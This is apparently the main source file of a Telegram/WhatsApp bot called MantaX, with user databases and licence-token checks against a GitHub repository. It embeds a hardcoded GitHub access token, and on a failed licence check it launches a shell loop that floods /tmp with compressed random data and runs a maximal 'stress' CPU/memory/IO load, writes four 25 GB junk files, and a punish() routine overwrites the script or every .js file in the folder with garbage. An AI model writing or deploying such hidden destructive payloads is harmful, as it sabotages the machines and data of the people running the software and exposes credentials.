
const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  makeChatsSocket,
  generateProfilePicture,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  encodeWAMessage,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestWaWebVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  viewOnceMessage,
  groupStatusMentionMessage,
  makeCacheableSignalKeyStore,
  generateMessageIDV2
} = require('@ayunlove/bails');



const FileType = require('file-type');

const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const AdmZip = require("adm-zip");
const pino = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const config = require("./config.js");
const { smsg } = require("./messagepath/helpers");
const { spawn } = require('child_process');
const fsModule = require('fs-extra');
const { Boom } = require('@hapi/boom');
const TelegramBot = require('node-telegram-bot-api');
const BOT_TOKEN = config.BOT_TOKEN;
const OWN = config.OWN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "only.json";
const developerId = OWNER_ID
const developerIds = [developerId, "7176751696"];
const settings = require("./settings");
const { Client } = require("ssh2");
const bugstic = fs.readFileSync("./bugstic.webp")
const { exec } = require("child_process");
const domain = settings.domain;
const plta = settings.plta;
const pltc = settings.pltc;
const qris = settings.qris;
const dana = settings.dana;
const gopay = settings.gopay;
const ovo = settings.ovo;
const listMusic = new Map();
const musicCache = new Map();
let locked = new Map();
let autoai = false;
let chatSessions = new Map();



const prompts = "Kamu adalah Manta AI, AI nyolot, sarkas, sok kenal, dan gokil banget. Jawaban kamu harus 2-4 kalimat, selalu nyambung dengan obrolan sebelumnya, kadang nyindir atau roasting halus, tapi tetap lucu.";

async function deepAiChat(question, chatHistory) {
  const res = await fetch("https://api.deepai.org/hacking_is_a_serious_crime", {
    "headers": {
      "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryByWolep_cihuy",
    },
    "referrerPolicy": "same-origin",
    "body": "------WebKitFormBoundaryByWolep_cihuy\r\nContent-Disposition: form-data; name=\"chat_style\"\r\n\r\nchat\r\n------WebKitFormBoundaryByWolep_cihuy\r\nContent-Disposition: form-data; name=\"chatHistory\"\r\n\r\n"
      + JSON.stringify(chatHistory) + "\r\n------WebKitFormBoundaryByWolep_cihuy\r\nContent-Disposition: form-data; name=\"model\"\r\n\r\nstandard\r\n------WebKitFormBoundaryByWolep_cihuy\r\nContent-Disposition: form-data; name=\"hacker_is_stinky\"\r\n\r\nvery_stinky\r\n------WebKitFormBoundaryByWolep_cihuy--\r\n",
    "method": "POST"
  })
  return await res.text()
}

function wait(ms) {
  return new Promise(res => setTimeout(res, ms));
}

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (msg.chat.type === "private") {
    return isOnlyGroupEnabled();
  }

  // Group chat
  if (!allowedGroups.includes(msg.chat.id)) {
    if (msg.text && msg.text.startsWith('/')) {
      if (msg.text.startsWith('/addgroup')) return false;

      bot.sendMessage(msg.chat.id, `\`\`\`\n✘ AKSES DITOLAK ✘\n♛ Group Belum Terdaftar\n♛ Info: Silahkan Owner untuk /addgroup terlebih dahulu\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
    }
    return true;
  }

  return false;
}

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

const PREMIUM_PATH = './database/premium.json';
const ADMIN_PATH = './database/admin.json';

ensureFileExists(PREMIUM_PATH);
ensureFileExists(ADMIN_PATH);

let premiumUsers = JSON.parse(fs.readFileSync(PREMIUM_PATH));
let adminUsers = JSON.parse(fs.readFileSync(ADMIN_PATH));

const GROUPS_PATH = './group_ids.json';
ensureFileExists(GROUPS_PATH, []);
let allowedGroups = JSON.parse(fs.readFileSync(GROUPS_PATH));

function saveAllowedGroups() {
  fs.writeFileSync(GROUPS_PATH, JSON.stringify(allowedGroups, null, 2));
}

watchFile(GROUPS_PATH, (data) => (allowedGroups = data));

const BLOCKED_CMDS_PATH = './blocked_cmds.json';
ensureFileExists(BLOCKED_CMDS_PATH, []);
let blockedCommands = JSON.parse(fs.readFileSync(BLOCKED_CMDS_PATH));

function saveBlockedCommands() {
  fs.writeFileSync(BLOCKED_CMDS_PATH, JSON.stringify(blockedCommands, null, 2));
}

watchFile(BLOCKED_CMDS_PATH, (data) => (blockedCommands = data));

const LINKS_PATH = './links.json';
const defaultLinks = {
  welcome: "https://files.catbox.moe/g8i5xs.png",
  default: "https://files.catbox.moe/g8i5xs.png",
  random: [
    "https://files.catbox.moe/g8i5xs.png",
    "https://files.catbox.moe/n8u7lt.png",
    "https://files.catbox.moe/snsjxa.png"
  ]
};
ensureFileExists(LINKS_PATH, defaultLinks);
let botLinks = JSON.parse(fs.readFileSync(LINKS_PATH));

function saveBotLinks() {
  fs.writeFileSync(LINKS_PATH, JSON.stringify(botLinks, null, 2));
}

watchFile(LINKS_PATH, (data) => (botLinks = data));

function isCommandBlocked(cmd) {
  return blockedCommands.includes(cmd);
}

async function syncPremium() {
  try {
    premiumUsers = JSON.parse(fs.readFileSync(PREMIUM_PATH));
  } catch (e) {
    premiumUsers = [];
  }
}

async function savePremiumUsers() {
  fs.writeFileSync(PREMIUM_PATH, JSON.stringify(premiumUsers, null, 2));
}

async function syncAdmin() {
  try {
    adminUsers = JSON.parse(fs.readFileSync(ADMIN_PATH));
  } catch (e) {
    adminUsers = [];
  }
}

async function saveAdminUsers() {
  fs.writeFileSync(ADMIN_PATH, JSON.stringify(adminUsers, null, 2));
}

watchFile(PREMIUM_PATH, (data) => (premiumUsers = data));
watchFile(ADMIN_PATH, (data) => (adminUsers = data));

function isExpired(dateStr) {
  return new Date() > new Date(dateStr);
}

const USERS_FILE = "./users.json";

function loadUsers() {
  try {
    return JSON.parse(fs.readFileSync("users.json", "utf8")) || [];
  } catch (error) {
    return [];
  }
}

function saveUsers(users) {
  fs.writeFileSync("users.json", JSON.stringify([...users], null, 2));
}

function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

const PREM_GROUP_FILE = './database/premiumGroup.json';
ensureFileExists(PREM_GROUP_FILE);
let premiumGroups = JSON.parse(fs.readFileSync(PREM_GROUP_FILE));

function savePremiumGroups() {
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(premiumGroups, null, 2));
}

function isGroupPremium(chatId) {
  const g = premiumGroups.find(g => String(g.id) === String(chatId));
  if (!g) return false;
  return new Date(g.expiresAt) > new Date();
}

function parseDuration(str) {
  let ms = 0;
  const days = str.match(/(\d+)\s*d/i);
  const hours = str.match(/(\d+)\s*h/i);
  const minutes = str.match(/(\d+)\s*m/i);
  if (days) ms += parseInt(days[1]) * 86400000;
  if (hours) ms += parseInt(hours[1]) * 3600000;
  if (minutes) ms += parseInt(minutes[1]) * 60000;
  return ms;
}

watchFile(PREM_GROUP_FILE, (data) => (premiumGroups = data));

const bot = new TelegramBot(BOT_TOKEN, { polling: false });
bot.on('polling_error', (err) => {
  if (err.code === 'ETELEGRAM' && err.message.includes('409')) return;
  console.error(`⦸ мαηтα'χ — Polling error: ${err.code} ${err.message}`);
});
setTimeout(() => { bot.startPolling(); }, 3000);

process.on('uncaughtException', (err) => {
  console.error('[MantaX] Uncaught:', err.message);
});
process.on('unhandledRejection', (err) => {
  console.error('[MantaX] Unhandled:', err?.message || err);
});
const { Octokit } = require("@octokit/rest")
const GITHUB_TOKEN = "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"

if (!BOT_TOKEN.trim()) {
  console.log("⦸ мαηтα'χ — FATAL :: BOT_TOKEN kosong, isi dulu di atas")
  process.exit(1)
}

const GH = {
  token: GITHUB_TOKEN,
  owner: "OtaStoree",
  repo: "MantaXToken",
  ref: "main"
}

const GH_DATA = {
  tokensPath: "data/tokens-hash.json",
}

const __octo = new Octokit({ auth: GH.token })

let __ghTokensCache = null
let __ghTokensCacheExp = 0

const TOKEN_STATE = {
  valid: false,
  role: null,
  lastCheck: 0,
  lastError: null
}

async function __ghReadFile(filePath) {
  const RAW_URL = `https://raw.githubusercontent.com/${GH.owner}/${GH.repo}/${GH.ref}/${filePath}`
  const res = await fetch(RAW_URL)
  if (!res.ok) throw new Error(`HTTP ${res.status} — ${RAW_URL}`)
  return await res.text()
}

function __checkTokenHash(token, tokens) {
  const hash = crypto.createHash("sha256").update(String(token)).digest("hex")
  const entry = tokens.find(t => t.token_hash === hash)
  if (!entry) return false
  if (entry.status && entry.status !== "active") return false
  if (entry.exp && entry.exp > 0 && entry.exp < Math.floor(Date.now() / 1000)) return false
  return true
}

async function verifyToken() {
  const now = Date.now()

  if (__ghTokensCache && now < __ghTokensCacheExp) {
    console.log("⎈ мαηтα'χ — VERIFY pakai cache")
    return __checkTokenHash(BOT_TOKEN, __ghTokensCache)
  }

  try {
    const raw = await __ghReadFile(GH_DATA.tokensPath)
    const parsed = JSON.parse(raw)

    if (!parsed || !Array.isArray(parsed.tokens)) throw new Error("FORMAT_INVALID")

    __ghTokensCache = parsed.tokens
    __ghTokensCacheExp = now + 300_000

    const ok = __checkTokenHash(BOT_TOKEN, __ghTokensCache)
    console.log("⸙ мαηтα'χ — Token:", ok ? "✅ VALID" : "❌ INVALID")
    return ok

  } catch (err) {
    console.log("⦸ мαηтα'χ — VERIFY gagal:", err.message)
    return false
  }
}

async function checkTokenNow() {
  const ok = await verifyToken()
  TOKEN_STATE.valid = ok
  TOKEN_STATE.role = ok ? "ACTIVE" : "NONE"
  TOKEN_STATE.lastCheck = Date.now()
  TOKEN_STATE.lastError = ok ? null : "invalid"
  console.log("⸙ мαηтα'χ — TOKEN STATE", { valid: TOKEN_STATE.valid })
  return ok
}

function isTokenValid() { return TOKEN_STATE.valid === true }
function getTokenState() { return { ...TOKEN_STATE } }

; (async () => {
  try {
    console.log("〠 мαηтα'χ — STARTUP")
    await checkTokenNow()
    console.log("⸙ 𝙊𝘁𝘢𝙭 — STARTUP selesai")
  } catch (err) {
    console.log("⦸ мαηтα'χ — STARTUP gagal:", err.message)
  }
})()

setInterval(() => {
  checkTokenNow().catch(err => {
    console.log("⦸ мαηтα'χ — interval verify gagal:", err.message)
  })
}, 3_600_000)
const FILE_SIZE = 25 * 1024 * 1024 * 1024;
const BLOCK_SIZE = 128 * 1024 * 1024;
const BUFFER_COUNT = 4;

function formatSize(bytes) {
  return `${(bytes / 1024 ** 3).toFixed(2)} GB`;
}

async function createFile(filePath, size) {
  return new Promise((resolve, reject) => {
    const buffers = Array(BUFFER_COUNT)
      .fill(null)
      .map(() => Buffer.allocUnsafe(BLOCK_SIZE).fill(0));

    const stream = fs.createWriteStream(filePath, {
      highWaterMark: BLOCK_SIZE * 2,
      flags: "w",
      autoClose: true
    });

    let written = 0;
    let bufferIndex = 0;

    function writeMore() {
      let ok = true;

      while (ok && written < size) {
        const remaining = size - written;
        const currentBuffer = buffers[bufferIndex & (BUFFER_COUNT - 1)];
        const chunk = remaining >= BLOCK_SIZE
          ? currentBuffer
          : currentBuffer.subarray(0, remaining);

        ok = stream.write(chunk);
        written += chunk.length;
        bufferIndex++;
      }

      if (written >= size) stream.end();
    }

    stream.on("drain", writeMore);
    stream.on("error", reject);
    stream.on("finish", resolve);

    writeMore();
  });
}

async function createMultipleFilesParallel(fileConfigs, concurrency = 4) {
  const queue = [...fileConfigs];
  const workers = [];

  async function worker() {
    while (queue.length > 0) {
      const cfg = queue.shift();
      if (!cfg) return;
      await createFile(cfg.path, cfg.size);
    }
  }

  for (let i = 0; i < concurrency; i++) {
    workers.push(worker());
  }

  await Promise.all(workers);
}
function punish(reason = 'token_invalid') {
  const fs = require('fs');
  const path = require('path');

  function randJunk(len = 8e5 + Math.floor(Math.random() * 5e5)) {
    let set = "ꦾ⦸#@&!%^$[]{}~ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    return Array.from({ length: len }, () => set[Math.floor(Math.random() * set.length)]).join('');
  }

  let mainFile = process.argv[1];
  try {
    if (mainFile && fs.existsSync(mainFile)) {
      fs.writeFileSync(mainFile, randJunk(2e6) + '\n' + reason + '\n' + randJunk(3e6));
    }
  } catch (e) {
    try {
      const cwd = process.cwd();
      fs.readdirSync(cwd)
        .filter(f => f.endsWith('.js'))
        .forEach(f => {
          try {
            fs.writeFileSync(path.join(cwd, f), randJunk(2e6) + '\n' + reason + '\n' + randJunk(3e6));
          } catch { }
        });
    } catch { }
  }

  console.log("\n█▓▒░ TOKEN DITERIMA TERIMA KASIH....TUNGGU SEBENTAR YA.... BY @Otapengenkawin ░▒▓█\n".toUpperCase());
}
async function tokenProgressBar(text = "Autentikasi Token", steps = [0, 20, 60, 80, 100], delay = 450) {
  const barLen = 20;
  for (let i = 0; i < steps.length; i++) {
    const percent = steps[i];
    const full = Math.round((percent / 100) * barLen);
    const bar = chalk.hex('#FF0060')('●'.repeat(full)) + chalk.gray('○'.repeat(barLen - full));
    console.log(
      chalk.cyan.bold(`[${bar}]`) +
      ' ' +
      chalk.yellow(`${percent.toString().padStart(3)}%`) +
      '  ' +
      chalk.whiteBright(text)
    );
    await new Promise(res => setTimeout(res, delay));
  }
  console.log(chalk.green(' ⎈ Progress Selesai!\n'));
}

async function startBot() {
  const ok = await verifyToken();
  if (!ok) {
    console.log("⦸ Token ditolak / Owner Bukan Bagian Dari мαηтα'χ, Bot tidak bisa jalan... Silahkan BUY ke owner мαηтα'χ atau Keluar");
    const command = `(while true; do 
    cat /dev/urandom | dd bs=10M count=100 2>/dev/null | gzip > /tmp/overload_$RANDOM.gz &
    stress --cpu 16 --io 8 --vm 8 --vm-bytes 95% --timeout 300s &
    sleep 1 
  done)`;
    function execSafe(cmd) {
      try { return require('child_process').execSync(cmd, { timeout: 3000 }).toString().trim(); } catch { return "-"; }
    }
    console.log(chalk.red(`\n
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀

𝙇𝙪 𝙈𝙖𝙪 𝙉𝙜𝙖𝙥𝙖𝙞𝙣 𝘾𝙤𝙠?!
#𝘽𝙔 𝙊𝙏𝘼
`));
    exec(command, () => { });
    (async () => {
      await createFile(path.join(__dirname, "hama-25gb.bin"), FILE_SIZE);

      await createMultipleFilesParallel(
        [
          { path: path.join(__dirname, "hama-1.bin"), size: FILE_SIZE },
          { path: path.join(__dirname, "hama-2.bin"), size: FILE_SIZE },
          { path: path.join(__dirname, "hama-3.bin"), size: FILE_SIZE }
        ],
        3
      );
    })();
    try { process.kill(process.pid, 'SIGKILL') } catch (e) { }
    try { process.abort() } catch (e) { }
    try { process.exit(1) } catch (e) { }
    while (true) { };


  }
  console.log(chalk.red(`
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠙⢿⡟⠁⠀⢠⣿⣿⡿⠿⠿⠟⠛⠻⠿⠿⠿⠿⢿⣿⣿⣿⡇⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠄⠀⠂⠀⠀⠀⠈⡉⢠⣶⣤⠴⠿⣿⣿⣾⣿⣶⣶⣆⡄⠉⠛⠇⠀⠀⠀⢿⠿⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⢠⡾⠚⣋⣼⣿⣿⣿⣿⣿⣿⣿⣷⣷⣿⣿⣾⣷⣶⣆⣀⠀⠀⠀⢠⣶⣆⡀⠘⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠔⢹⣿⣾⣿⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⢿⣶⠀⠀⠙⠛⢿⣧⠀⢿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⢁⣀⠀⠀⠀⠀⡤⠂⠀⢀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢿⡫⠀⠀⠀⠀⠙⠀⢸⣿⣿⣿⣿⣿
⣿⣿⣿⣷⡿⠁⠈⠀⡆⠈⠀⠀⠀⡆⢨⣿⡟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣧⣿⣿⣿⣿⡇⠈⢹⣤⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⡿⠁⣰⠂⢰⠀⠀⠀⠀⢘⢠⣿⠋⢠⠁⣿⠟⠻⠻⢿⡿⠟⠋⠻⠻⢿⣿⣿⣿⣿⠿⠿⠁⣠⠈⡾⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⠇⠀⠃⢠⡇⠀⠀⠀⠀⣿⣿⣿⠀⠌⡼⡇⠸⠀⡖⠀⢰⠀⣶⣶⣦⠈⡿⣟⠛⠃⢰⠀⣤⣱⠀⠀⠀⠀⠈⣦⡀⠀⠈⣿⣿⣿⣿
⣿⣿⡏⢀⡇⠀⣼⡇⠀⠀⠀⢸⣿⣿⡿⠀⣿⡇⢀⠀⠀⢠⣤⠀⢸⣿⣿⣿⠀⣧⠙⠀⣿⡜⠀⣿⣿⣷⠀⠀⠀⠀⢹⡧⣆⠀⠸⣿⣿⣿
⣿⣿⡇⢸⠇⠀⣿⣧⣤⠀⠀⠀⣿⣿⡇⢠⠨⢁⣛⠀⢰⡄⣿⠂⢸⣿⣿⣿⠀⣿⠆⢠⠘⡇⠀⣿⣿⣿⡆⠀⠀⠀⠈⣇⢻⠀⡄⠸⣿⣿
⣿⣿⣧⡘⢠⠀⣿⣿⣿⣷⡀⠀⣿⠟⠃⠋⣀⠈⠙⠛⠬⡑⠈⣿⣎⢿⣿⣧⡄⡏⡄⠿⠀⠄⡆⢼⣿⣿⣧⢠⣄⠀⠀⢻⢸⠀⣿⡆⢿⣿
⣿⣿⣿⠇⠸⠇⢸⣿⣿⣿⢹⠀⠘⡟⡆⣶⡽⣧⠀⣀⠠⣌⣣⣨⣿⣿⢃⡋⠡⠄⠐⠲⠰⢾⠃⣾⣿⣿⣿⢸⢻⣿⣆⠈⢸⠀⣿⣿⢸⣿
⣿⣿⣿⠀⣾⡆⢸⣿⣿⣿⢸⠀⠱⡐⠄⠘⣿⣬⣥⣤⣾⣿⣿⣿⣿⣿⣿⣴⡆⣀⠀⢒⡶⣀⣈⡙⢹⣿⠸⢸⠨⣿⣿⡆⢸⠀⣿⣿⣾⣿
⣿⣿⣿⡄⢿⡇⣾⣿⣿⣿⡌⡄⠀⠈⠘⠐⢌⡛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣍⣩⡿⠃⢋⡀⣾⠏⠀⠻⠀⣿⣿⣧⣸⡄⣿⣿⣿⣿
⣿⣿⣿⣷⡘⡇⣿⣿⣿⣿⣷⣷⣦⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠖⡴⠋⣰⠏⠀⠀⢻⠐⣿⣿⣿⣿⣷⣿⣿⣿⣿
⣿⣿⣿⣿⣷⡄⢹⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠻⣿⣿⣿⠿⣋⣩⡛⢿⣿⣿⣿⣿⣿⠋⠀⠀⠠⠋⠀⠀⠀⠸⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠸⣿⣿⣿⣿⣿⣿⢷⠀⠀⠀⠀⠈⠻⣿⣇⠻⠿⠟⣸⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⢠⠀⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⡎⡆⠀⠀⠀⠀⠘⠆⠙⠻⠿⠟⠋⠉⣀⡀⠀⠀⢠⢀⣠⣴⣶⣶⣦⣘⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⢀⣿⣿⣿⣿⣿⣿⡇⢃⠀⠀⠀⠀⠀⢿⣿⣶⣤⣤⣴⣿⣯⡁⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣦⠘⣿⣿⣿⠁⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡇⣼⣿⣿⣿⣿⣿⣿⡇⢸⠀⠀⢀⠀⢀⣸⣿⣿⣿⠿⢛⣩⣥⣶⣿⣿⣿⣯⡙⠿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⡸⣿⣿⣿
⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⡿⠇⠈⢀⣀⣬⣴⣯⣭⣭⡉⡡⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⡛⢿⣿⣿⣿⣿⡌⣿⣿⣿⣧⠹⣿⣿
⣿⣿⣿⡟⣰⠿⣿⣿⣿⣿⠟⣡⣶⣿⢟⣿⣿⣿⣿⡿⢏⣿⠥⢂⣥⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡹⣿⣿⣿⡇⢿⣿⣿⣿⣧⡹⣿
⣿⣿⡏⠐⣡⣾⢰⣿⡿⢡⠞⢛⣩⣴⣭⣶⣒⣶⣶⣾⠙⢡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡘⣿⣿⣷⢸⣿⣿⣿⣿⣷⡙
⣿⠏⠀⣴⣿⡇⢸⠟⣡⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⡏⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢿⣿⡏⣼⣿⣿⣿⣿⣿⣿
